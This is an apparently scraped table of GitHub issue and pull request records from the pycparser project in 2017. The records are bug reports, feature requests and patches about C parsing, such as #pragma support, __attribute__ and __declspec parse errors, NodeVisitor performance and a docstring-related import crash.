eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/223,277145288,MDU6SXNzdWUyNzcxNDUyODg=,223,[Question] Is it possible to ignore parsing errors due to unknown types?,2945834,closed,FALSE,NA,NA,1,2017-11-27T19:48:01Z,2017-11-28T17:10:59Z,2017-11-28T17:10:59Z,NONE,NA,"I'm thinking if it's possible to use pycparser for a proof-of-concept where I might have partial source code. In such cases, some types will not be known. For example, given this code:

```
void foo(void)
{
  struct_t x;
  (...whatever...)
}
```

I would like to have the AST with the 'x' variable of type ""struct_t"". I know you already answered [this very same question years ago](https://stackoverflow.com/questions/30959479/is-there-any-way-to-avoid-parse-errors-in-pycparser-library-of-python). However, my aim is to, when I have partial source code, automatically get the unknown types out of the errors and automatically generate the unknown types.

So, my questions:

1. Is it possible with the latest versions to ignore parsing errors due to unknown types?
2. If not, could you give me a tip about where should I take a look in order to try to automatically create the unknown types?

Thanks in advance!",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/223/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/223/comments,https://api.github.com/repos/eliben/pycparser/issues/223/events,https://github.com/eliben/pycparser/issues/223,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/222,276045694,MDExOlB1bGxSZXF1ZXN0MTU0MTM2ODY3,222,Add support for #pragma in struct_declaration (Issue #221).,13061643,closed,FALSE,NA,NA,1,2017-11-22T12:10:31Z,2017-11-22T13:53:03Z,2017-11-22T13:52:54Z,CONTRIBUTOR,NA,"Support `#pragma` within a `struct`

Note: On first run (when `lextab.py`/`yacctab.py` do not exist yet), I get the following message:
```
Generating LALR tables
WARNING: 1 shift/reduce conflict
```
As this also happens on master, I assume this is OK.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/222/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/222/comments,https://api.github.com/repos/eliben/pycparser/issues/222/events,https://github.com/eliben/pycparser/pull/222,https://api.github.com/repos/eliben/pycparser/pulls/222
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/221,276008687,MDU6SXNzdWUyNzYwMDg2ODc=,221,Support #pragma in struct declarations,13061643,closed,FALSE,NA,NA,1,2017-11-22T10:04:02Z,2018-04-22T15:42:35Z,2018-04-22T15:42:35Z,CONTRIBUTOR,NA,"Pragmas do not seem to be supported within typedefs.
Updating `tests.test_c_generator.TestCtoC.test_pragma` to: 
```
    def test_pragma(self):
        self._assert_ctoc_correct(r'''
            #pragma foo
            void f() {
                #pragma bar
                i = (a, b, c);
            }
            typedef struct s {
            #pragma baz
            } s;
        ''')
```
raises a `ParseError`.

This occured in a source similar to:
```
typedef struct MyStruct {
    int a;
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored ""-Wdeprecated-declarations""
    int b;
#pragma GCC diagnostic pop
}
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/221/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/221/comments,https://api.github.com/repos/eliben/pycparser/issues/221/events,https://github.com/eliben/pycparser/issues/221,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/220,274105463,MDExOlB1bGxSZXF1ZXN0MTUyNzM2NDA4,220,"Improve NodeVisitor performance, add iterator on Node children (Issue #219).",13061643,closed,FALSE,NA,NA,0,2017-11-15T10:27:12Z,2017-11-21T04:55:48Z,2017-11-21T04:55:48Z,CONTRIBUTOR,NA,"This is a resolution for Issue #219 
Performance improvement can be measured with the following script:
```
with self._open_c_file('cppd_with_stdio_h.c') as f:
    code = f.read()
setup = '''
from pycparser.c_ast import NodeVisitor
from pycparser.c_parser import CParser
code = %r
p = CParser().parse(code)
visitor = NodeVisitor()
''' % (code)
print(timeit.timeit('visitor.visit(p)',
                     setup = setup,
                     number=100))
```

On my workstation, this is twice as fast as the original implementation, while passing all unit tests.

",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/220/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/220/comments,https://api.github.com/repos/eliben/pycparser/issues/220/events,https://github.com/eliben/pycparser/pull/220,https://api.github.com/repos/eliben/pycparser/pulls/220
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/219,274101029,MDU6SXNzdWUyNzQxMDEwMjk=,219,Improve NodeVisitor performance,13061643,closed,FALSE,NA,NA,2,2017-11-15T10:12:29Z,2019-08-26T22:14:41Z,2019-08-26T22:14:41Z,CONTRIBUTOR,NA,"I'm using `NodeVisitor`s to visit ASTs on large source files (1MB+).

When profiling my scripts, a significant part of the execution time is spent 
- in the `Node.children()` method, generating the name/value tuples
- in the `NodeVisitor.visit()` method, computing the name and looking up the actual visitor method.

Performance could be improved by:
- Providing an iterator on the children, without creating intermediate lists/tuples objects. 
  Names could be omitted as they are not used by `NodeVisitor`.
- Using an internal cache of `visit_*` functions to speed up their lookup.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/219/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/219/comments,https://api.github.com/repos/eliben/pycparser/issues/219/events,https://github.com/eliben/pycparser/issues/219,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/218,269176122,MDExOlB1bGxSZXF1ZXN0MTQ5MjQxNTIz,218,Fixup C Preprocessor,14236428,closed,FALSE,NA,NA,2,2017-10-27T17:12:45Z,2017-10-28T01:31:10Z,2017-10-28T01:31:10Z,NONE,NA,"There are several errors in macro expansion algorithm. 
This patch series first adds example files for each error.
Then it suggests fixes.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/218/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/218/comments,https://api.github.com/repos/eliben/pycparser/issues/218/events,https://github.com/eliben/pycparser/pull/218,https://api.github.com/repos/eliben/pycparser/pulls/218
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/217,267863422,MDU6SXNzdWUyNjc4NjM0MjI=,217,Allow comments in the AST,4221911,closed,FALSE,NA,NA,3,2017-10-24T00:58:17Z,2017-10-26T22:02:07Z,2017-10-25T16:54:14Z,NONE,NA,"It's useful to have comments in the code in the AST, and, preprocessors have an option to include comments in the preprocessed output (e.g. clang -E --comments).  This is because my use of pycparser is to parse C code and produce documentation, where I want to take further actions on the comments.

Comments can be divided into LongComments and LineComments and considered Whitespace. A comparable implementation: https://github.com/pointlander/peg/blob/master/grammars/c/c.peg#L404
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/217/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/217/comments,https://api.github.com/repos/eliben/pycparser/issues/217/events,https://github.com/eliben/pycparser/issues/217,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/216,265038622,MDExOlB1bGxSZXF1ZXN0MTQ2Mjc5NDk5,216,Format enums with one value per line,543719,closed,FALSE,NA,NA,2,2017-10-12T18:20:07Z,2017-10-19T03:12:27Z,2017-10-19T03:12:27Z,CONTRIBUTOR,NA,Issue #213,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/216/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/216/comments,https://api.github.com/repos/eliben/pycparser/issues/216/events,https://github.com/eliben/pycparser/pull/216,https://api.github.com/repos/eliben/pycparser/pulls/216
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/215,264295288,MDU6SXNzdWUyNjQyOTUyODg=,215,Designated Initializers report error when identifier is a type,976492,open,FALSE,NA,NA,3,2017-10-10T16:34:01Z,2020-03-03T14:41:06Z,NA,NONE,NA,"Considering the following C99 code:
```
typedef enum Foo {
    e_foo
} Foo;

typedef struct Bar {
    char Foo;
} Bar;

void main() {
    Bar bar = {.Foo = 'C'};
}
```

The name `Foo` is a field of `struct Bar`, but it is also the name of a type. GCC compiles this with the following command:
```
gcc /tmp/foo.c -o /dev/null -std=c99
```

However, pycparser reports an error (versions 2.16 and 2.18 with Python 3.4.3 x64 under Ubuntu 14.04):
> pycparser.plyparser.ParseError: bug_desig_init.c:10:17: before: Foo

In the C99 specification draft, §1 section 6.5.3:
> If more than one declaration of a particular identifier is visible at any point in a translation unit, the syntactic context disambiguates uses that refer to different entities. Thus, there are separate name spaces for various categories of identifiers, as follows: [...]",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/215/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/215/comments,https://api.github.com/repos/eliben/pycparser/issues/215/events,https://github.com/eliben/pycparser/issues/215,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/214,263788337,MDExOlB1bGxSZXF1ZXN0MTQ1Mzc2Mjgx,214,Add Python 3.6,1324225,closed,FALSE,NA,NA,1,2017-10-09T05:27:01Z,2017-10-10T12:44:35Z,2017-10-10T12:24:33Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/214/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/214/comments,https://api.github.com/repos/eliben/pycparser/issues/214/events,https://github.com/eliben/pycparser/pull/214,https://api.github.com/repos/eliben/pycparser/pulls/214
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/213,263520316,MDU6SXNzdWUyNjM1MjAzMTY=,213,Consider generating enums on multiple lines.,543719,closed,FALSE,NA,NA,2,2017-10-06T17:38:31Z,2017-10-19T03:34:15Z,2017-10-19T03:34:15Z,CONTRIBUTOR,NA,"Presently I get:

```
enum ArrayName_e {ArrayName_ParameterName = 0, ArrayName_NewArrayParameterElement = 1, ArrayName_NewArrayParameterElement = 2, ArrayName_NewArrayParameterElement = 3, ArrayName_NewArrayParameterElement = 4, ArrayName_Count = 5};
```

I would personally prefer if enumerations were generated with one element per line such as:

```
enum ArrayName_e {
  ArrayName_ParameterName = 0,
  ArrayName_NewArrayParameterElement = 1,
  ArrayName_NewArrayParameterElement = 2,
  ArrayName_NewArrayParameterElement = 3,
  ArrayName_NewArrayParameterElement = 4,
  ArrayName_Count = 5
};
```

If there is interest in this change I could presumably provide a PR.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/213/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/213/comments,https://api.github.com/repos/eliben/pycparser/issues/213/events,https://github.com/eliben/pycparser/issues/213,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/212,263209994,MDU6SXNzdWUyNjMyMDk5OTQ=,212,"How to get end of a for loop, while in C file using the ast",9855594,closed,FALSE,NA,NA,2,2017-10-05T17:45:09Z,2017-10-10T14:36:44Z,2017-10-06T03:26:12Z,NONE,NA,"**Is there a way to get the end of a  for, while nodes inside a function with the information given by the AST? or is there a way to calculate that value with the AST data?**

I saw this [article](https://stackoverflow.com/questions/36029091/pycparser-how-to-get-end-of-function-in-c-file
), but for functions I can calculate on which line each finishes. the problem is for other nodes.


",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/212/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/212/comments,https://api.github.com/repos/eliben/pycparser/issues/212/events,https://github.com/eliben/pycparser/issues/212,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/211,256696634,MDU6SXNzdWUyNTY2OTY2MzQ=,211,Unable to parse simple header that contains __declspec,7879295,closed,FALSE,NA,NA,2,2017-09-11T13:10:27Z,2017-09-11T13:49:59Z,2017-09-11T13:49:59Z,NONE,NA,"I'm using pycparser 2.18 (Python 2.7.11) and I'm unable to parse following header:

```
#ifndef EXAMPLE_DLL_H
#define EXAMPLE_DLL_H


#ifdef BUILDING_EXAMPLE_DLL
#define EXAMPLE_DLL __declspec(dllexport)
#else
#define EXAMPLE_DLL __declspec(dllimport)
#endif

void EXAMPLE_DLL hello(const char *s);

int EXAMPLE_DLL Double(int x);

#endif  // EXAMPLE_DLL_H
```

I'm using 'gcc -E' to preprocess the header, and here's the output:

```
# 1 "".\\..\\src-gen\\cpp_input.c""
# 1 ""<command-line>""
# 1 "".\\..\\src-gen\\cpp_input.c""
# 11 "".\\..\\src-gen\\cpp_input.c""
void __declspec(dllimport) hello(const char *s);

int __declspec(dllimport) Double(int x);
```

And finally, here's the traceback:

```
  File ""C:\Python27\lib\site-packages\pycparser\c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""C:\Python27\lib\site-packages\pycparser\c_parser.py"", line 1761, in p_error
    column=self.clex.find_tok_column(p)))
  File ""C:\Python27\lib\site-packages\pycparser\plyparser.py"", line 66, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: .\\..\\src-gen\\cpp_input.c:11:28: before: hello
```


",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/211/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/211/comments,https://api.github.com/repos/eliben/pycparser/issues/211/events,https://github.com/eliben/pycparser/issues/211,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/210,255885257,MDU6SXNzdWUyNTU4ODUyNTc=,210,Mysterious 'At end of input' error,1290112,closed,FALSE,NA,NA,9,2017-09-07T10:09:52Z,2017-09-20T02:29:24Z,2017-09-19T18:17:34Z,NONE,NA,"I'm trying to parse headers on my project, and getting this strange error:
```
Traceback (most recent call last):
  File ""./pycparse.py"", line 30, in <module>
    cpp_path='cpp', cpp_args=cpp_opts)
  File ""/usr/lib/python3.6/site-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/usr/lib/python3.6/site-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/usr/lib/python3.6/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/usr/lib/python3.6/site-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/usr/lib/python3.6/site-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/usr/lib/python3.6/site-packages/pycparser/c_parser.py"", line 1763, in p_error
    self._parse_error('At end of input', self.clex.filename)
  File ""/usr/lib/python3.6/site-packages/pycparser/plyparser.py"", line 66, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: include/CFG/config.h: At end of input
```
Any suggestions how can I debug it, and find out what's going on?
I tried pycparser 2.17 & 2.18 on python 3.6.1. Tried to google for that error, but found nothing similar.
Also, I'm using cpp:
```
    cpp_opts=[ ""-Ifake_libc_include"",
            ""-D__attribute__(x)="",
            ""-D__extension__(x)="", -Ixxx ]
```

While I was trying to parse my headers, I've noticed strange reaction on static inline functions in headers:
```
Traceback (most recent call last):
  File ""./pycparse.py"", line 30, in <module>
    cpp_path='cpp', cpp_args=cpp_opts)
  File ""/usr/lib/python3.6/site-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/usr/lib/python3.6/site-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/usr/lib/python3.6/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/usr/lib/python3.6/site-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/usr/lib/python3.6/site-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/usr/lib/python3.6/site-packages/pycparser/c_parser.py"", line 1761, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/usr/lib/python3.6/site-packages/pycparser/plyparser.py"", line 66, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: some_header.h:49:1: before: {
```
And I had to disable all such places in headers, after that I end up with this 'At end of input' error.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/210/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/210/comments,https://api.github.com/repos/eliben/pycparser/issues/210/events,https://github.com/eliben/pycparser/issues/210,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/209,255791361,MDExOlB1bGxSZXF1ZXN0MTM5NzAwNjQz,209,Add clicky link for examples,1449387,closed,FALSE,NA,NA,0,2017-09-07T01:55:31Z,2017-12-31T12:54:38Z,2017-12-31T12:54:38Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/209/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/209/comments,https://api.github.com/repos/eliben/pycparser/issues/209/events,https://github.com/eliben/pycparser/pull/209,https://api.github.com/repos/eliben/pycparser/pulls/209
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/208,252950695,MDU6SXNzdWUyNTI5NTA2OTU=,208,"Symbol 'id_init_declarator_list_opt' used, but not defined as a token or a rule",11046232,closed,FALSE,NA,NA,1,2017-08-25T16:15:55Z,2017-08-26T12:21:57Z,2017-08-26T12:21:57Z,NONE,NA,"Hello,

I'm currently trying to investigate an issue related to the build process of another tool and I'm getting these errors related to `pycparser`during the build:

```
$ /usr/local/bin/python2 tools/generate_pins.py NUCLEO_F207ZG
ERROR: /usr/local/lib/python2.7/site-packages/pycparser/c_parser.py:630: Symbol 'id_init_declarator_list_opt' used, but not defined as a token or a rule
ERROR: /usr/local/lib/python2.7/site-packages/pycparser/c_parser.py:709: Symbol 'declaration_specifiers_no_type_opt' used, but not defined as a token or a rule
ERROR: /usr/local/lib/python2.7/site-packages/pycparser/c_parser.py:714: Symbol 'declaration_specifiers_no_type_opt' used, but not defined as a token or a rule
ERROR: /usr/local/lib/python2.7/site-packages/pycparser/c_parser.py:719: Symbol 'declaration_specifiers_no_type_opt' used, but not defined as a token or a rule
WARNING: /usr/local/lib/python2.7/site-packages/pycparser/plyparser.py:42: Rule 'specifier_qualifier_list_opt' defined, but not used
WARNING: /usr/local/lib/python2.7/site-packages/pycparser/plyparser.py:42: Rule 'declaration_specifiers_opt' defined, but not used
WARNING: There are 2 unused rules
WARNING: Symbol 'id_init_declarator' is unreachable
WARNING: Symbol 'id_init_declarator_list' is unreachable
WARNING: Symbol 'specifier_qualifier_list_opt' is unreachable
WARNING: Symbol 'declaration_specifiers_opt' is unreachable
ERROR: Infinite recursion detected for symbol 'direct_declarator'
ERROR: Infinite recursion detected for symbol 'declaration_specifiers_no_type'
Traceback (most recent call last):
  File ""tools/generate_pins.py"", line 247, in <module>
    main()
  File ""tools/generate_pins.py"", line 237, in main
    pins = enumerate_pins(pins_file, ['./tools'] + list(includes), defines)
  File ""tools/generate_pins.py"", line 154, in enumerate_pins
    parser=GnuCParser())
  File ""/usr/local/lib/python2.7/site-packages/pycparserext/ext_c_parser.py"", line 47, in __init__
    debug=yacc_debug, write_tables=False)
  File ""/usr/local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 3426, in yacc
    raise YaccError('Unable to build parser')
pycparser.ply.yacc.YaccError: Unable to build parser
```

My apologies if this seems a bit off topic but I am wondering if you may have some advice that would help me to find the culprit?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/208/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/208/comments,https://api.github.com/repos/eliben/pycparser/issues/208/events,https://github.com/eliben/pycparser/issues/208,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/207,247321313,MDU6SXNzdWUyNDczMjEzMTM=,207,Calling parse multiple times,9433661,closed,FALSE,NA,NA,1,2017-08-02T09:08:00Z,2017-08-03T15:15:36Z,2017-08-03T15:15:36Z,CONTRIBUTOR,NA,"Hi!
I wish to parse multiple inputs, and there are `typedef` dependencies needed by the second input declared in the first input. To be clear:

```python
from pycparser import c_parser, c_ast

text_1 = """"""
typedef struct test_st {
    int a;
} Test;
""""""

text_2 = """"""
struct test_include {
    Test b;
};
""""""

parser = c_parser.CParser()
parser.parse(text_1, filename='<stdin>')
parser.parse(text_2, filename='<stdin>')
```

It seems that `typedef` tokens are stored in the `_scope_stack`. This variable is reset at each call of `parse`, so the previous `typedefs` are lost. 

Actually, I can do the trick by calling directly `parser.cparser.parse` the same way as in `parse`.
Is it a valid solution to you, or is there any other way to do this?

Thanks




",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/207/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/207/comments,https://api.github.com/repos/eliben/pycparser/issues/207/events,https://github.com/eliben/pycparser/issues/207,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/206,247192394,MDExOlB1bGxSZXF1ZXN0MTMzNTY1MDM4,206,Fixes #205,11508954,closed,FALSE,NA,NA,1,2017-08-01T20:32:34Z,2017-08-02T02:30:31Z,2017-08-02T02:30:31Z,NONE,NA,By checking for whether the __doc__ attribute exists.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/206/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/206/comments,https://api.github.com/repos/eliben/pycparser/issues/206/events,https://github.com/eliben/pycparser/pull/206,https://api.github.com/repos/eliben/pycparser/pulls/206
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/205,247192057,MDU6SXNzdWUyNDcxOTIwNTc=,205,AttributeError: 'NoneType' object has no attribute 'replace',11508954,closed,FALSE,NA,NA,2,2017-08-01T20:31:20Z,2018-07-04T15:53:47Z,2017-08-02T02:30:46Z,NONE,NA,"https://i.imgur.com/hVCfdYz.png
in plyparser.py
Encountered while building pupy",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/205/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/205/comments,https://api.github.com/repos/eliben/pycparser/issues/205/events,https://github.com/eliben/pycparser/issues/205,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/204,244993488,MDU6SXNzdWUyNDQ5OTM0ODg=,204,Support for register type xxx __asm__(yyy),21258241,closed,FALSE,NA,NA,3,2017-07-24T07:28:12Z,2017-09-06T12:08:05Z,2017-09-04T21:53:38Z,NONE,NA,"Is it possible to add support for the following syntax:

register typeName variableName __asm__(""registerName"");

Best regards,
Martin
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/204/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/204/comments,https://api.github.com/repos/eliben/pycparser/issues/204/events,https://github.com/eliben/pycparser/issues/204,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/203,244991574,MDU6SXNzdWUyNDQ5OTE1NzQ=,203,Small simplifications in c_generator,21258241,closed,FALSE,NA,NA,1,2017-07-24T07:18:19Z,2017-07-26T02:43:34Z,2017-07-26T02:43:34Z,NONE,NA,"""else"" and ""elif"" are not necessary if there is a ""return"" before.

[c_generator.patch.zip](https://github.com/eliben/pycparser/files/1169070/c_generator.patch.zip)
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/203/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/203/comments,https://api.github.com/repos/eliben/pycparser/issues/203/events,https://github.com/eliben/pycparser/issues/203,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/202,244986921,MDU6SXNzdWUyNDQ5ODY5MjE=,202,self is missing in yacc,21258241,closed,FALSE,NA,NA,1,2017-07-24T06:52:45Z,2017-07-26T02:43:04Z,2017-07-26T02:43:04Z,NONE,NA,"In line 1363 Prodnames is missing ""self."".
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/202/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/202/comments,https://api.github.com/repos/eliben/pycparser/issues/202/events,https://github.com/eliben/pycparser/issues/202,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/201,244983795,MDU6SXNzdWUyNDQ5ODM3OTU=,201,Parsing __attribute__ fails with latest version,21258241,closed,FALSE,NA,NA,1,2017-07-24T06:33:16Z,2017-07-26T02:42:01Z,2017-07-26T02:42:01Z,NONE,NA,"Trying following example fails with ""pycparser.plyparser.ParseError: :3:32: before: __attribute__"":

src = r""""""
void testFunc(void) {
    extern int fooBarBuf[0x08] __attribute__ ((asection("".foo.bar"",""f=awB"")));
} """"""

from pycparser import c_parser
p = c_parser.CParser()
ast = p.parse(src)
ast.show()
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/201/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/201/comments,https://api.github.com/repos/eliben/pycparser/issues/201/events,https://github.com/eliben/pycparser/issues/201,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/200,243192895,MDU6SXNzdWUyNDMxOTI4OTU=,200,2.18 breaks typedef redefinitions,1195272,closed,FALSE,NA,NA,7,2017-07-15T18:48:03Z,2018-05-24T12:09:53Z,2018-05-24T12:09:53Z,NONE,NA,"The recent release 2.18 of pycparser breaks Pymunk as seen in this issue: https://github.com/viblo/pymunk/issues/118

I have committed a fix to Pymunk, but thought it could be good to leave a reference here in case this backwards incompatible change was unintended or breaks other things.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/200/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/200/comments,https://api.github.com/repos/eliben/pycparser/issues/200/events,https://github.com/eliben/pycparser/issues/200,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/199,242185906,MDU6SXNzdWUyNDIxODU5MDY=,199,Coords in preprocessed files instead of source?,16694980,closed,FALSE,NA,NA,2,2017-07-11T21:15:21Z,2017-07-13T16:14:01Z,2017-07-13T16:14:01Z,NONE,NA,"I need to have the coords for function declarations in the preprocessed file as opposed to the source file so that I can wrap them in pragmas. Is this possible to do? Ideally inline functions would be included. 

Preprocessing, then editing source, then compiling from scratch is not an option due to size of the source. ",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/199/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/199/comments,https://api.github.com/repos/eliben/pycparser/issues/199/events,https://github.com/eliben/pycparser/issues/199,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/198,241278789,MDExOlB1bGxSZXF1ZXN0MTI5NDE1Mjcw,198,Don't fail if docstrings are disabled,5820654,closed,FALSE,NA,NA,28,2017-07-07T14:20:18Z,2018-09-12T06:27:28Z,2017-11-21T04:57:21Z,NONE,NA,"The attribute `__doc__` will return `None` if running CPython in `-OO` mode [as it discards docstrings](https://docs.python.org/3/using/cmdline.html#cmdoption-OO).

FYI, this broke builds for me because `cryptography` uses `cffi` which uses `pycparser` at install time, and always pulls the latest version regardless of any dependency pinning in `requirements.txt`. It would be nice to prioritize this getting in a release ASAP to fix this issue.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/198/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/198/comments,https://api.github.com/repos/eliben/pycparser/issues/198/events,https://github.com/eliben/pycparser/pull/198,https://api.github.com/repos/eliben/pycparser/pulls/198
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/197,240915255,MDU6SXNzdWUyNDA5MTUyNTU=,197,Error importing pycparser since 2.18 update,461956,closed,FALSE,NA,NA,7,2017-07-06T10:39:25Z,2017-11-23T10:06:20Z,2017-07-10T14:52:40Z,NONE,NA,"Once again I find my builds and deployments failing due to a new version of pycparser being pulled in as part of another dependency that ends up installing the latest version and failing.

Stack trace:

```
  File ""/srv/www/project/current/.venv/lib/python2.7/site-packages/cffi/api.py"", line 63, in __init__
    from . import cparser
  File ""/srv/www/project/current/.venv/lib/python2.7/site-packages/cffi/cparser.py"", line 7, in <module>
    import pycparser

  File ""/srv/www/project/current/.venv/lib/python2.7/site-packages/pycparser/__init__.py"", line 14, in <module>
    from .c_parser import CParser
  File ""/srv/www/project/current/.venv/lib/python2.7/site-packages/pycparser/c_parser.py"", line 20, in <module>
    class CParser(PLYParser):
  File ""/srv/www/project/current/.venv/lib/python2.7/site-packages/pycparser/plyparser.py"", line 95, in template
    _create_param_rules(cls, method)
  File ""/srv/www/project/current/.venv/lib/python2.7/site-packages/pycparser/plyparser.py"", line 112, in _create_param_rules
    param_rule.__doc__ = func.__doc__.replace('xxx', xxx).replace('yyy', yyy)
AttributeError: 'NoneType' object has no attribute 'replace'
```
Python 2.7.12
Running inside of uwsgi 2.0.13.1

